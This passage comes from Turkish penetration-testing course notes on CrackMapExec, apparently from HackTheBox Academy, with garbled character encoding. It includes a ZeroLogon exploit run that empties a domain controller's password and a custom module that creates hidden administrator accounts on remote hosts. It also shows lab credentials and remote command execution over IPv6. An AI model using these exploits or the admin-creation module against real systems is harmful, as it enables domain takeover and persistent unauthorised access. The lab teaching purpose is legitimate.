username=carole.holmes, password=Y3t4n0th3rP4ssw0rd, groupid=None,
pillaged_from=None) => None
SMB 172.16.10.3 445 DC01 [+]
INLANEFREIGHT.HTB\carole.holmes:Y3t4n0th3rP4ssw0rd
DEBUG:root:Connecting to ncacn_np:172.16.10.3[\PIPE\FssagentRpc]
DEBUG Connecting to ncacn_np:172.16.10.3[\PIPE\FssagentRpc]
DEBUG:root:Something went wrong, check error status => SMB SessionError:
STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
DEBUG Something went wrong, check error status => SMB SessionError:
STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
DEBUG:root:Connected!
DEBUG Connected!
DEBUG:root:Binding to a8e0653c-2744-4389-a61d-7373df8b2292
DEBUG Binding to a8e0653c-2744-4389-a61d-7373df8b2292
DEBUG:root:Something went wrong, check error status => SMB SessionError:
STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or
function.)
DEBUG Something went wrong, check error status => SMB SessionError:
STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or
function.)
DEBUG:root:Successfully bound!
DEBUG Successfully bound!
DEBUG:root:ipsc = False
DEBUG ipsc = False
DEBUG:root:Using the default IsPathSupported
DEBUG Using the default IsPathSupported
DEBUG:root:Sending IsPathSupported!
DEBUG Sending IsPathSupported!
DEBUG:root:Something went wrong, check error status => SMB SessionError:
STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or
function.)
DEBUG Something went wrong, check error status => SMB SessionError:
STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or
function.)
DEBUG:root:Attack may of may not have worked, check your listener...
DEBUG Attack may of may not have worked, check your listener...
DEBUG:root:Target not vulnerable to ShadowCoerce
DEBUG Target not vulnerable to ShadowCoerce
DEBUG:root:Stopped thread poller
DEBUG Stopped thread poller

```


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

```
proxychains4 -q crackmapexec smb 172.16.10.3 -M ms17-010

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)

```


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

```
git clone https://github.com/dirkjanm/CVE-2020-1472 -q

cd CVE-2020-1472/

proxychains4 -q python3 cve-2020-1472-exploit.py dc01 172.16.10.3
Performing authentication attempts...
==========================================================================
==========================================================================
==========================================
==========================================================================
==========================================================================
==========
Target vulnerable, changing account password to empty string
Result: 0
Exploit complete!

```

```
proxychains4 -q crackmapexec smb 172.16.10.3 -u 'DC01


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

```
wget "https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64" -O vscode.deb -q

sudo dpkg -i vscode.deb

Selecting previously unselected package code.
(Reading database ... 560441 files and directories currently installed.)
Preparing to unpack vscode.deb ...
Unpacking code (1.73.1-1667967334) ...
Setting up code (1.73.1-1667967334) ...
Processing triggers for desktop-file-utils (0.26-1) ...
Processing triggers for bamfdaemon (0.5.4-2) ...
Rebuilding /usr/share/applications/bamf-2.index...
Processing triggers for mailcap (3.69) ...
Processing triggers for shared-mime-info (2.0-1) ...

```

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

```
code
```

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*- 
# from .... import ....

class CMEModule:
    name = 'name_module'
    description = "description"
    supported_protocols = ['smb', 'mssql', 'etc']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        MYOPTION description
        MYOPTION2 description2
        '''
        # when the user is connected but not the admin of the target
        # user cannot execute a system command, but it can be useful for pass
        # policy, share, Kerberoastable accounts, etc.
    
    def on_login(self, context, connection):
        # when the user is connected and the admin of the target
        # user can execute a system command
        pass
    
    def on_admin_login(self, context, connection):
        # Example of executing a command
        # command = ''
        # context.log.info('Executing command')
        # p = connection.execute(command, True)
        # context.log.highlight(p)
        pass

```



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*- 
# from .... import ....

class CMEModule:
    '''
    Created to teach HackTheBox Academy students how to create a
    module for CrackMapExec
    Reference: https://academy.hackthebox.com/
    Module by @juliourena
    '''
    
    name = 'createadmin'
    description = "Create a new administrator account"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        USER Choose a username for the administrator account. Default:
        plaintext
        PASS Choose a password for the administrator. Default:
        HackTheBoxCME1337!
        '''
        self.user = "plaintext"
        
        if 'USER' in module_options:
            if module_options['USER'] == "":
                context.log.error('Invalid value for USER option!')
                exit(1)
            self.user = module_options['USER']
        
        self.password = "HackTheBoxCME1337!"
        
        if 'PASS' in module_options:
            if module_options['PASS'] == "":
                context.log.error('Invalid value for PASS option!')
                exit(1)
            self.password = module_options['PASS']

    def on_admin_login(self, context, connection):
        # Implement functionality here
        pass

```

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

```
def on_admin_login(self, context, connection):
    context.log.info('Creating user with the following values: USER {} and PASS {}'.format(self.user, self.password))
    command = '(net user ' + self.user + ' "' + self.password + '" /add /Y && net localgroup administrators ' + self.user + ' /add)'
    
    context.log.info('Executing command')
    p = connection.execute(command, True)
    context.log.highlight(p)

```


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
class CMEModule:
    '''
    Created to teach HackTheBox Academy students how to create a
    module for CrackMapExec
    Reference: https://academy.hackthebox.com/
    Module by @juliourena
    '''
    name = 'createadmin'
    description = "Create a new administrator account"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        USER Choose a username for the administrator account. Default:
        plaintext
        PASS Choose a password for the administrator. Default:
        asdasd123
        '''
        self.user = "plaintext"
        if 'USER' in module_options:
            if module_options['USER'] == "":
                context.log.error('Invalid value for USER option!')
                exit(1)
            self.user = module_options['USER']
        
        self.password = "asdasd123"
        if 'PASS' in module_options:
            if module_options['PASS'] == "":
                context.log.error('Invalid value for PASS option!')
                exit(1)
            self.password = module_options['PASS']

    def on_admin_login(self, context, connection):
        context.log.info('Creating user with the following values: USER {} and PASS {}'.format(self.user, self.password))
        command = '(net user ' + self.user + ' "' + self.password + '" /add /Y && net localgroup administrators ' + self.user + ' /add)'
        
        context.log.info('Executing command')
        p = connection.execute(command, True)
        context.log.highlight(p)

```


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M createadmin

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
CREATEAD... 10.129.203.121 445 DC01 [*] Creating user with
the following values: USER plaintext and PASS asdasd123
CREATEAD... 10.129.203.121 445 DC01 [*] Executing command
CREATEAD... 10.129.203.121 445 DC01 The command completed successfully.
The command completed successfully.
```

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M createadmin -o
USER=htb PASS=Newpassword!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
CREATEAD... 10.129.203.121 445 DC01 [*] Creating user with
the following values: USER htb and PASS Newpassword!
CREATEAD... 10.129.203.121 445 DC01 [*] Executing command
CREATEAD... 10.129.203.121 445 DC01 The command completed successfully.
The command completed successfully.
```


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

```
cat ~/.cme/cme.conf
[CME]
workspace = default
last_used_db = mssql
pwn3d_label = Pwn3d!
audit_mode = #
<SNIP>
```

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01!

SMB 10.129.203.121 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.203.121 445 MS01 [+]
inlanefreight.htb\robert:######## (Pwn3d!)

```

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

```
crackmapexec smb 10.129.203.121 -u robert -p robert_password.txt

SMB 10.129.203.121 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.203.121 445 MS01 [+]
inlanefreight.htb\robert:######## (Pwn3d!)
```


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

```
crackmapexec smb 10.129.203.121 -u robert -p robert_password.txt -M
get_netconnections

SMB 10.129.203.121 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.203.121 445 MS01 [+]
inlanefreight.htb\robert:######## (Pwn3d!)
GET_NETC... 10.129.203.121 445 MS01 [+] IP Address:
['172.16.1.5'] Search Domain: ['inlanefreight.htb', 'htb']
GET_NETC... 10.129.203.121 445 MS01 [+] IP Address:
['10.129.203.121', 'fe80::8c8a:5209:5876:537d',
'dead:beef::8c8a:5209:5876:537d', 'dead:beef::1e2'] Search Domain:
['inlanefreight.htb', 'htb']
GET_NETC... 10.129.203.121 445 MS01 [*] Saved raw output
to network-connections-10.129.203.121-2022-11-16_080253.log

```

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

```
crackmapexec smb dead:beef::8c8a:5209:5876:537d -u robert -p
robert_password.txt -x "ipconfig"

SMB dead:beef::8c8a:5209:5876:537d 445 MS01 [*]
Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb)
(signing:False) (SMBv1:False)
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 [+]
inlanefreight.htb\robert:######## (Pwn3d!)
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 [+]
Executed command
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 Windows
IP Configuration
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
Ethernet adapter Ethernet1:
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
Connection-specific DNS Suffix . :
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 IPv4
Address. . . . . . . . . . . : 172.16.1.5
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 Subnet
Mask . . . . . . . . . . . : 255.255.255.0
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 Default
Gateway . . . . . . . . . :
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
Ethernet adapter Ethernet0 2:
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
Connection-specific DNS Suffix . : .htb
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 IPv6
Address. . . . . . . . . . . : dead:beef::1e2
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 IPv6
Address. . . . . . . . . . . : dead:beef::8c8a:5209:5876:537d
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 Linklocal IPv6 Address . . . . . : fe80::8c8a:5209:5876:537d%13
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 IPv4
Address. . . . . . . . . . . : 10.129.203.121
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 Subnet
Mask . . . . . . . . . . . : 255.255.0.0
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 Default
Gateway . . . . . . . . . : fe80::250:56ff:feb9:b9fc%13
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
10.129.0.1

```



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

```
crackmapexec smb 10.129.203.121 -u robert -p robert_password.txt --shares

SMB 10.129.203.121 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.203.121 445 MS01 [+]
inlanefreight.htb\robert:######## (Pwn3d!)
[*] completed: 100.00% (1/1)
SMB 10.129.203.121 445 MS01 [+] Enumerated shares
SMB 10.129.203.121 445 MS01 Share
Permissions Remark
SMB 10.129.203.121 445 MS01 ----- ------
----- ------
SMB 10.129.203.121 445 MS01 ADMIN$
READ,WRITE Remote Admin
SMB 10.129.203.121 445 MS01 C$
READ,WRITE Default share
SMB 10.129.203.121 445 MS01 CertEnroll
READ,WRITE Active Directory Certificate Services share
SMB 10.129.203.121 445 MS01 IPC$ READ
Remote IPC

```

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

```
echo -e "\n10.129.203.121 dc01.inlanefreight.htb dc01 inlanefreight
inlanefreight.htb" | sudo tee -a /etc/hosts

10.129.203.121 dc01.inlanefreight.htb dc01 inlanefreight inlanefreight.htb
```

```
cat /etc/hosts
# Host addresses
127.0.0.1 localhost
127.0.1.1 cyberspace
::1 localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.203.121 dc01.inlanefreight.htb dc01 inlanefreight inlanefreight.htb
```

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

